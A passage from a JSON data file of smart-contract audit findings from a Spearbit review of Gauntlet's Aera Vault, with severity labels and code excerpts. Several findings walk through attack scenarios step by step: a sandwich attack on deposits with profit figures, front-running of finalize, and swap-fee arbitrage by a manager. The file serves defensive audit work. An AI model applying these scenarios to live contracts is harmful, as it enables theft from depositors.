        "body": "Transactions calling the deposit() function are susceptible to sandwich attacks where an attacker can extract value from deposits. A similar issue exists in the withdraw() function but the minimum check on the pool holdings limits the attacks impact. Consider the following scenario (swap fees ignored for simplicity): 1. Suppose the Balancer pool contains two tokens, WETH and DAI, and weights are 0.5 and 0.5. Currently, there is 1 WETH and 3k DAI in the pool and WETH spot price is 3k. 2. The Treasury wants to add another 3k DAI into the Aera vault, so it calls the deposit() function. 3. The attacker front-runs the Treasurys transaction. They swap 3k DAI into the Balancer pool and get out 0.5 WETH. The weights remain 0.5 and 0.5, but because WETH and DAI balances become 0.5 and 6k, WETHs spot price now becomes 12k. 4. Now, the Treasurys transaction adds 3k DAI into the Balancer pool and upgrades the weights to 0.5*1.5: 0.5 = 0.6: 0.4. 5. The attacker back-runs the transaction and swaps the 0.5 WETH they got in step 3 back to DAI (and recovers the WETHs spot price to near but above 3k). According to the current weights, they can get 9k*(1 - 1/r) = 3.33k DAI from the pool, where r = (20.4)(1/0.6). 6. As a result the attacker profits 3.33k - 3k = 0.33k DAI.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: High Risk"
        ]
    },
    {
        "title": "allowance() doesnt limit withdraw()s",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The allowance() function is meant to limit withdraw amounts. However, allowance() can only read and not alter state because its visibility is set to view. Therefore, the withdraw() function can be called on demand until the entire Vault/Pool balance has been drained, rendering the allowance() function ineffective. function withdraw(uint256[] calldata amounts) ... { ... uint256[] memory allowances = validator.allowance(); ... for (uint256 i = 0; i < tokens.length; i++) { if (amounts[i] > holdings[i] || amounts[i] > allowances[i]) { revert Aera__AmountExceedAvailable(... ); } } } // can't update state due to view function allowance() external view override returns (uint256[] memory amounts) { amounts = new uint256[](count); for (uint256 i = 0; i < count; i++) { amounts[i] = ANY_AMOUNT; } } from both IWithdrawal-",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Malicious manager could cause Vault funds to be inaccessible",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The calculateAndDistributeManagerFees() function pushes tokens to the manager and if for unknown reasons this action fails the entire Vault would be blocked and funds become inaccessible. This occurs because the following functions depend on the execution of calculateAndDistributeManagerFees(): deposit(), withdraw(), setManager(), claimManagerFees(), initiateFinalization(), and therefore final- ize() as well. Within calculateAndDistributeManagerFees() the function safeTransfer() is the riskiest and could fail under the following situations:  A token with a callback is used, for example an ERC777 token, and the callback is not implemented correctly.  A token with a blacklist option is used and the manager is blacklisted. For example USDC has such blacklist functionality. Because the manager can be an unknown party, a small risk exist that he is malicious and his address could be blacklisted in USDC. Note: set as high risk because although probability is very small, impact results in Vault funds to become inacces- sible. function calculateAndDistributeManagerFees() internal { ... for (uint256 i = 0; i < amounts.length; i++) { tokens[i].safeTransfer(manager, amounts[i]); } }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: High Risk"
        ]
    },
    {
        "title": "updateWeightsGradually allows change rates to start in the past with a very high maximumRatio",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The current updateWeightsGradually is using startTime instead of time that should be Math.max(block.timestamp, startTime). Because internally Balancer will use startTime = Math.max(currentTime, startTime); as the startTime, this allows to: the minimal start  Have a startTime in the past.  Have a targetWeights[i] higher than allowed. We also suggest adding another check to prevent startTime > endTime. Although Balancer replicates the same check it is still needed in the Aera implementation to prevent transactions to revert because of an underflow error on uint256 duration = endTime - startTime;",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: High Risk"
        ]
    },
    {
        "title": "The vault manager has unchecked power to create arbitrage using setSwapFees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "A previously known issue was that a malicious vault manager could arbitrage the vault like in the below scenario: 1. Set the swap fees to a high value by setSwapFee (10% is the maximum). 2. Wait for the market price to move against the spot price. 3. In the same transaction, reduce the swap fees to ~0 (0.0001% is the minimum) and arbitrage the vault. The proposed fix was to limit the percentage change of the swap fee to a maximum of MAXIMUM_SWAP_FEE_- PERCENT_CHANGE each time. However, because there is no restriction on how many times the setSwapFee function can be called in a block or transaction, a malicious manager can still call it multiple times in the same transaction and eventually set the swap fee to the value they want.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Implement a function to claim liquidity mining rewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Balancer offers a liquidity mining rewards distribution for liquidity providers. Liquidity Mining distributions are available to claim weekly through the MerkleOrchard contract. Liquid- ity Providers can claim tokens from this contract by submitting claims to the tokens. These claims are checked against a Merkle root of the accrued token balances which are stored in a Merkle tree. Claim- ing through the MerkleOrchard is much more gas-efficient than the previous generation of claiming contracts, especially when claiming multiple weeks of rewards, and when claiming multiple tokens. The AeraVault is itself the only liquidity provider of the Balancer pool deployed, so each week its entitled to claim those rewards. Currently, those rewards cannot be claimed because the AeraVault is missing an implementation to interact with the MerkleOrchard contract, causing all rewards (BAL + other tokens) to remain in the MerkleOrchard forever.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Owner can circumvent allowance() via enableTradingWithWeights()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The vault Owner can set arbitrary weights via disableTrading() and then call enableTrading- WithWeights() to set the spot price and create arbitrage opportunities for himself. This way allowance() in withdraw() checks, which limit the amount of funds an owner can withdraw, can be circumvented. Something similar can be done with enableTradingRiskingArbitrage() in combination with sufficient time. Also see the following issues:  allowance() doesnt limit withdraw()s  enableTradingWithWeights allow the Treasury to change the pools weights even if the swap is not disabled  Separation of concerns Owner and Manager function disableTrading() ... onlyOwnerOrManager ... { setSwapEnabled(false); } function enableTradingWithWeights(uint256[] calldata weights) ... onlyOwner ... { ... pool.updateWeightsGradually(timestamp, timestamp, weights); setSwapEnabled(true); } function enableTradingRiskingArbitrage() ... onlyOwner ... { setSwapEnabled(true); } 13",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Front-running attacks on finalize could affect received token amounts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The returnFunds() function (called by finalize()) withdraws the entire holdings in the Balancer pool but does not allow the caller to specify and enforce the minimum amount of received tokens. Without such check the finalize() function could be susceptible to a front-running attack. A potential exploit scenario looks as follows: 1. The notice period has passed and the Treasury calls finalize() on the Aera vault. Assume the Balancer pool contains 1 WETH and 3000 DAI, and that WETH and DAI weights are both 0.5. 2. An attacker front-runs the Treasurys transaction and swaps in 3000 DAI to get 0.5 WETH from the pool. 3. As an unexpected result, the Treasury receives 0.5 WETH and 6000 DAI. Therefore an attacker can force the Treasury to accept the trade that they offer. Although the Treasury can execute a reverse trade on another market to recover the token amount and distribution, not every Treasury can execute such trade (e.g., if a timelock controls it). Notice that the attacker may not profit from the swap because of slippage but they could be incentivized to perform such an attack if it causes considerable damage to the Treasury.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "safeApprove in depositToken could revert for non-standard token like USDT",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Some non-standard tokens like USDT will revert when a contract or a user tries to approve an al- lowance when the spender allowance has already been set to a non zero value. In the current code we have not seen any real problem with this fact because the amount retrieved via depositToken() is approved send to the Balancer pool via joinPool() and managePoolBalance(). Balancer transfers the same amount, lowering the approval to 0 again. However, if the approval is not lowered to exactly 0 (due to a rounding error or another unfore- seen situation) then the next approval in depositToken() will fail (assuming a token like USDT is used), blocking all further deposits. Note: Set to medium risk because the probability of this happening is low but impact would be high. We also should note that OpenZeppelin has officially deprecated the safeApprove function, suggesting to use instead safeIncreaseAllowance and safeDecreaseAllowance.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Consult with Balancer team about best approach to add and remove funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The Aera Vault uses AssetManagers functionality of function managePoolBalance() to add and remove funds. The standard way to add and remove funds in Balancer is via joinPool() / exitPool(). Using the managePoolBalance() function might lead to future unexpected behavior. Additionally, this disables the capacity to implement the original intention of AssetManagers functionality, e.g. storing funds elsewhere to generate yield.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Fee on transfer can block several functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Some tokens have a fee on transfer, for example USDT. Usually such fee is not enabled but could be re-enabled at any time. With this fee enabled the withdrawFromPool() function would receive slightly less tokens than the amounts requested from Balancer causing the next safeTransfer() call to fail because there are not enough tokens inside the contract. This means withdraw() calls will fail. Functions deposit() and calculateAndDistributeManagerFees() can also fail because they have similar code. Note: The function returnFunds() is more robust and can handle this problem. Note: The problem can be alleviated by sending additional tokens directly to the Aera Vault contract to compensate for fees, lowering the severity of the problem to medium. function withdraw(uint256[] calldata amounts) ... { ... withdrawFromPool(amounts); // could get slightly less than amount with a fee on transfer ... for (uint256 i = 0; i < amounts.length; i++) { if (amounts[i] > 0) { tokens[i].safeTransfer(owner(), amounts[i]); // could revert it the full amounts[i] isn't ,! available ... } ... } }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "enableTradingWithWeights allow the Treasury to change the pools weights even if the swap is not disabled",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "enableTradingWithWeights is a function that can only be called by the owner of the Aera Vault contract and that should be used only to re-enable the swap feature on the pool while updating token weights. The function does not verify if the pools swap feature is enabled and for this reason, as a result, it allows the Treasury to act as the manager who is the only actor allowed to change the pool weights. The function should add a check to ensure that it is only callable when the pools swap is disabled.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "AeraVault constructor is not checking all the input parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The Aera Vault constructor has the role to handle Balancers ManagedPool deployment. The con- structor should increase the number of user input validation and the Gauntlet team should be aware of the possible edge case that could happen given that the deployment of the Aera Vault is handled directly by the Treasury and not by the Gauntlet team itself. We are going to list all the worst-case scenarios that could happen given the premise that the deployments are handled by the Treasury. 1. factory could be a wrapper contract that will deploy a ManagedPool. This would mean that the deployer could pass correct parameters to Aera Vault to pass these checks, but will use custom and malicious parameters on the factory wrapper to deploy the real Balancer pool. 2. swapFeePercentage value is not checked. On Balancer, the deployment will revert if the value is not in- side this range >= 1e12 (0.0001%) and <= 1e17 (10% - this fits in 64 bits). Without any check, the Gauntlet accept to follow the Balancers swap requirements. 3. manager_ is not checked. They could set the manager as the Treasury (owner of the vault) itself. This would give the Treasury the full power to manage the Vault. At least these values should be checked: address(0), address(this) or owner(). The same checks should also be done in the setManager() function. 4. validator_ could be set to a custom contract that will give full allowances to the Treasury. This would make the withdraw() act like finalize() allowing to withdraw all the funds from the vault/pool. 17 5. noticePeriod_ has only a max value check. Gauntlet team explained that a time delay between the ini- tialization of the finalize process and the actual finalize is needed to prevent the Treasury to be able to instantly withdraw all the funds. Not having a min value check allow the Treasury to set the value to 0 so there would be no delay between the initiateFinalization() and finalize() because noticeTimeoutAt == block.timestamp. 6. managementFee_ has no minimum value check. This would allow the Treasury to not pay the manager because the managerFeeIndex would always be 0. 7. description_ can be empty. From the Specification PDF, the description of the vault has the role to De- scribes vault purpose and modelling assumptions for differentiating between vaults. Being empty could lead to a bad UX for external services that needs to differentiate different vaults. These are all the checks that are done directly by Balancer during deployment via the Pool Factory:  BasePool constructor#L94-L95 min and max number of tokens.  BasePool constructor#L102token array is sorted following Balancer specification (sorted by token address).  BasePool constructor calling _setSwapFeePercentage min and max value for swapFeePercentage.  BasePool constructor calling vault.registerTokens token address uniqueness (cant have same Following the pathBasePool is calling from function _registerMinimalSwapInfoPoolTokens it also checks that token != IERC20(0). should call token in the pool), vault.registerTokens MinimalSwapInfoPoolsBalance. that  ManagedPool constructor calling _startGradualWeightChange Check min value of weight and that the total sum of the weights are equal to 100%. _startGradualWeightChange internally check that endWeight >= WeightedMath._MIN_WEIGHT and normalizedSum == FixedPoint.ONE.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Possible mismatch between Validator.count and AeraVault assets count",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "A weak connection between WithdrawalValidator and Aera Vault could lead to the inability of withdrawing from a Vault. Consider the following scenario: The Validator is deployed with a tokenCount < than Vault.getTokens().length. Inside the withdraw() function we reference the following code block: uint256[] memory allowances = validator.allowance(); uint256[] memory weights = getNormalizedWeights(); uint256[] memory newWeights = new uint256[](tokens.length); for (uint256 i = 0; i < tokens.length; i++) { if (amounts[i] > holdings[i] || amounts[i] > allowances[i]) { revert Aera__AmountExceedAvailable( address(tokens[i]), amounts[i], holdings[i].min(allowances[i]) ); } } A scenario where allowances.length < tokens.length would cause this function to revert with an Index out of bounds error. The only way for the Treasury to withdraw funds would be via the finalize() method which has a time delay.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Ensure vaults deployment integrity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The treasury could deploy on purpose or by accident a slightly different version of the contract and introduce bugs or backdoors. This might not be recognized by parties taking on Manager responsibilities (e.g. usually Gauntlet will be involved here).",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Frequent calling of calculateAndDistributeManagerFees() lowers fees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Via calculateAndDistributeManagerFees() a percentage of the Pool is subtracted and sent to the Manager. If this function is called too frequently his fees will be lower. For example:  If he calls it twice, while both time getting 1%, he actually gets: 1% + 1% * (100% - 1%) = 1.99%  If he waits longer until he has earned 2%, he actually gets: 2%, which is slightly more than 1.99%  If called very frequently the fees go to 0 (especially taking in account the rounding down). However the gas cost would be very high. The Manager can (accidentally) do this by calling claimManagerFees(). The Owner can (accidentally or on pur- pose (e.g. using 0 balance change) ) do this by calling deposit(), withdraw() or setManager(). Note: Rounding errors make this slightly worse. Also see the following issue: Possible rounding down of fees function claimManagerFees() ... { calculateAndDistributeManagerFees(); // get a percentage of the Pool }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OpenZeppelin best practices",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The Aera Vault uses OpenZeppelin release 4.3.2 which is copied into their github. The current release of OpenZeppelin is 4.6.0 and includes several updates and security fixes. The copies of the OpenZeppelin files are also (manually) changed to adapt the import paths. This has the risk of making a mistake in the process. import \"./dependencies/openzeppelin/SafeERC20.sol\"; import \"./dependencies/openzeppelin/IERC20.sol\"; import \"./dependencies/openzeppelin/IERC165.sol\"; import \"./dependencies/openzeppelin/Ownable.sol\"; import \"./dependencies/openzeppelin/ReentrancyGuard.sol\"; import \"./dependencies/openzeppelin/Math.sol\"; import \"./dependencies/openzeppelin/SafeCast.sol\"; import \"./dependencies/openzeppelin/ERC165Checker.sol\";",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Possible rounding down of fees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "If certain token has a few decimals numbers then fees could be rounded down to 0, especially if time between calculateAndDistributeManagerFees() is relatively small. This also could slightly shift the spot price because the balance of one coin is lowered while the other remains still. With fewer decimals the situation worsens, e.g. Gemini USD GUSD has 2 decimals, therefore the problem occurs with a balance of 10_000 GUSD. Note: The rounding down is probably neglectable in most cases. function calculateAndDistributeManagerFees() internal { ... for (uint256 i = 0; i < tokens.length; i++) { amounts[i] = (holdings[i] * managerFeeIndex) / ONE; // could be rounded down to 0 } ... } With 1 USDC in the vault and 2 hours between calculateAndDistributeManagerFees(), the fee for USDC is rounded down to 0. This behavior is demonstrated in the following POC: 21 import \"hardhat/console.sol\"; contract testcontract { uint256 constant ONE = 10**18; uint managementFee = 10**8; constructor() { // MAX_MANAGEMENT_FEE = 10**9; // 1 USDC uint holdings = 1E6; uint delay = 2 hours; uint managerFeeIndex = delay * managementFee; uint amounts = (holdings * managerFeeIndex) / ONE; console.log(\"Fee\",amounts); // fee is 0 } }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing nonReentrant modifier on initiateFinalization(), setManager() and claimManagerFees() functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The initiateFinalization() function is missing a nonReentrant modifier while calculateAnd- DistributeManagerFees() executes external calls. Same goes for setManager() and claimManagerFees() func- tions.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Potential division by 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "If the balance (e.g. holdings[]) of a token is 0 in deposit() then the dividing by holdings[] would cause a revert. Note: Function withdraw() has similar code but when holdings[]==0 its not possible to withdraw() anyway. Note: The current Mannon vault code will not allow the balances to be 0. Note: Although not used in the current code, in order to do a deregisterTokens(), Balancer requires the balance to be 0. Additionally, refer to the following Balancer documentation about the-vault#deregistertokens. The worst case scenario is deposit() not working. function deposit(uint256[] calldata amounts) ... { ... for (uint256 i = 0; i < amounts.length; i++) { if (amounts[i] > 0) { depositToken(tokens[i], amounts[i]); uint256 newBalance = holdings[i] + amounts[i]; newWeights[i] = (weights[i] * newBalance) / holdings[i]; // would revert if holdings[i] == 0 } ... ... } Similar divisions by 0 could occur in getWeightChangeRatio(). The function is called from updateWeightsGradu- ally(). If this is due to targetWeight being 0, then it is the desired result. Current weight should not be 0 due balancer checks. function getWeightChangeRatio(uint256 weight, uint256 targetWeight) ... { return weight > targetWeight ? (ONE * weight) / targetWeight : (ONE * targetWeight) / weight; // could revert if targetWeight == 0 // could revert if weight== 0 }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use ManagedPoolFactory instead of BaseManagedPoolFactory to deploy the Balancer pool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Currently the Aera Vault is using BaseManagedPoolFactory as the factory to deploy the Balancer pool while Balancers documentation recommends and encourages the usage of ManagedPoolFactory. Quoting the doc inside the BaseManagedPoolFactory: This is a base factory designed to be called from other factories to deploy a ManagedPool with a particular controller/owner. It should NOT be used directly to deploy ManagedPools without controllers. ManagedPools controlled by EOAs would be very dangerous for LPs. There are no restrictions on what the managers can do, so a malicious manager could easily manipulate prices and drain the pool. In this design, other controller-specific factories will deploy a pool controller, then call this factory to deploy the pool, passing in the controller as the owner. 23",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Adopt the two-step ownership transfer pattern",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "To prevent the Aera vault Owner, i.e. the Treasury, from calling renounceOwnership() and effec- tively breaking vault critical functions such as withdraw() and finalize(), the renounceOwnership() function is explicitly overridden to revert the transaction every time. However, the transferOwnership() function may also lead to the same issue if the ownership is transferred to an uncontrollable address because of human errors or attacks on the Treasury.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Implement zero-address check for manager_",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Non-existent zero-address checks inside the constuctor for the manager_ parameter. If manager_- becomes a zero address then calls to calculateAndDistributeManagerFees will burn tokens (transfer them to address(0)).",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Simplify tracking of managerFeeIndex",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The calculateAndDistributeManagerFees() function uses updateManagerFeeIndex() to keep track of management fees. It keeps track of both managerFeeIndex and lastFeeCheckpoint in storage vari- ables (e.g. costing SLOAD/SSTORE). However, because managementFee is immutable this can be simplified to one storage variable, saving gas and improving code legibility. uint256 public immutable managementFee; // can't be changed function calculateAndDistributeManagerFees() internal { updateManagerFeeIndex(); ... if (managerFeeIndex == 0) { return; use managerFeeIndex } ... // ... managerFeeIndex = 0; ... } function updateManagerFeeIndex() internal { managerFeeIndex += (block.timestamp - lastFeeCheckpoint) * managementFee; lastFeeCheckpoint = block.timestamp.toUint64(); }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Directly call getTokensData() from returnFunds()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The function returnFunds() calls getHoldings() and getTokens(). Both functions call getTokens- Data() thus waste gas unnecessarily. function returnFunds() internal returns (uint256[] memory amounts) { uint256[] memory holdings = getHoldings(); IERC20[] memory tokens = getTokens(); ... } function getHoldings() public view override returns (uint256[] memory amounts) { (, amounts, ) = getTokensData(); } function getTokens() public view override returns (IERC20[] memory tokens) { (tokens, , ) = getTokensData(); }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Change uint32 and uint64 to uint256",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The contract contains a few variables/constants that are smaller than uint256: noticePeriod, no- ticeTimeoutAt and lastFeeCheckpoint. This doesnt actually save gas because they are not part of a struct and still take up a storage slot. It even costs more gas because additional bits have to be stripped off. Additionally, there is a very small risk of lastFeeCheckpoint wrapping to 0 in the updateManagerFeeIndex() function. If that would happen, managerFeeIndex would get far too large and too many fees would be paid out. Finally, using int256 simplifies the code. contract AeraVaultV1 is IAeraVaultV1, Ownable, ReentrancyGuard { ... uint32 public immutable noticePeriod; ... uint64 public noticeTimeoutAt; ... uint64 public lastFeeCheckpoint = type(uint64).max; ... } function updateManagerFeeIndex() internal { managerFeeIndex += (block.timestamp - lastFeeCheckpoint) * managementFee; // could get large when lastFeeCheckpoint wraps lastFeeCheckpoint = block.timestamp.toUint64(); }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use block.timestamp directly instead of assigning it to a temporary variable.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "It is preferable to use block.timestamp directly in your code instead of assigning it to a temporary variable as it only uses 2 gas.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Consider replacing pool.getPoolId() with bytes32 public immutable poolId to save gas and ex- ternal calls",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The current implementation of Aera Vault always calls pool.getPoolId() or indirectly getPoolId() to retrieve the ID of the immutable state variable pool that has been declared at constructor time. The pool.getPoolId() is a getter function defined in the Balancer BasePool contract: function getPoolId() public view override returns (bytes32) { return _poolId; } Inside the same BasePool contract the _poolId is defined as immutable which means that after creating a pool it will never change. For this reason it is possible to apply the same logic inside the Aera Vault and use an immutable variable to avoiding external calls and save gas.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Save values in temporary variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "We observed multiple occurrences in the codebase where <var>.length was used in for loops. This could lead to more gas consumption as .length gets called repetitively until the for loop finishes. When indexed variables are used multiple times inside the loop in a read only way these can be stored in a temporary variable to save some gas. for (uint256 i = 0; i < tokens.length; i++) { // tokens.length has to be calculated repeatedly ... ... = tokens[i].balanceOf(...); tokens[i].safeTransfer(owner(), ...); } // tokens[i] has to be evaluated multiple times",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Aera could be prone to out-of-gas transaction revert when managing a high number of tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The Balancer ManagedPool used by Aera has a max limit of 50 token. Functions like: initialDeposit(), deposit(), withdraw() and finalize() involve numerous external direct and indirect (made by Balancer itself when called by Aera) calls and math calculations that are done for each token managed by the pool. The functions deposit() and withdraw() are especially gas intensive, given that they also internally call calcu- lateAndDistributeManagerFees() that will transfer, for each token, a management fee to the manager. For these reasons Aera should be aware that a high number of tokens managed by the Aera Vault could lead to out-of-gas reverts (max block size depends on which chain the project will be deployed).",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use a consistent way to call getNormalizedWeights()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The functions deposit() and withdraw() call function getNormalizedWeights() while the function updateWeightsGradually() and cancelWeightUpdates() call pool.getNormalizedWeights(). Although this is functionally the same, it is not consistent. 29 function deposit(uint256[] calldata amounts) ... { ... uint256[] memory weights = getNormalizedWeights(); ... emit Deposit(amounts, getNormalizedWeights()); } function withdraw(uint256[] calldata amounts) ... { ... uint256[] memory weights = getNormalizedWeights(); ... emit Withdraw(amounts, allowances, getNormalizedWeights()); } function updateWeightsGradually(...) ... { ... uint256[] memory weights = pool.getNormalizedWeights(); ... } function cancelWeightUpdates() ... { ... uint256[] memory weights = pool.getNormalizedWeights(); ... } function getNormalizedWeights() ... { return pool.getNormalizedWeights(); }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add function disableTrading() to IManagerAPI.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The disableTrading() function can also be called by managers because of the onlyOwnerOrMan- agermodifier. However in AeraVaultV1.sol it is located in the PROTOCOL API section. It is also not present in IManagerAPI.sol. contract AeraVaultV1 is IAeraVaultV1, Ownable, ReentrancyGuard { /// PROTOCOL API /// function disableTrading() ... onlyOwnerOrManager ... { ... } /// MANAGER API /// } interface IManagerAPI { function updateWeightsGradually(...) external; function cancelWeightUpdates() external; function setSwapFee(uint256 newSwapFee) external; function claimManagerFees() external; } // disableTrading() isn't present 30",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Doublecheck layout functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Different ways are used to layout functions. Especially the part between ( ... ) and between ) ... { is sometimes done on one line and sometimes split in multiple lines. Also { is sometimes at the end of a line and sometimes at the beginning. Although the layout is not disturbing it might be useful to doublecheck it. Here are a few examples of different layouts: function updateWeights(uint256[] memory weights, uint256 weightSum) internal ... { } function depositToken(IERC20 token, uint256 amount) internal { ... } function updatePoolBalance( uint256[] memory amounts, IBVault.PoolBalanceOpKind kind ) internal { ... } function updateWeights(uint256[] memory weights, uint256 weightSum) internal ... { } function updateWeightsGradually( uint256[] calldata targetWeights, uint256 startTime, uint256 endTime ) external override onlyManager whenInitialized whenNotFinalizing { ... } function getWeightChangeRatio(uint256 weight, uint256 targetWeight) internal pure returns (uint256) { } ...",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use Math library functions in a consistent way",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "In the AeraVaultV1 contract, the OZs Math library functions are attached to the type uint256. The min function is used as a member function whereas the max function is used as a library function.",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Informational"
        ]
    },
    {
        "title": "Separation of concerns Owner and Manager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
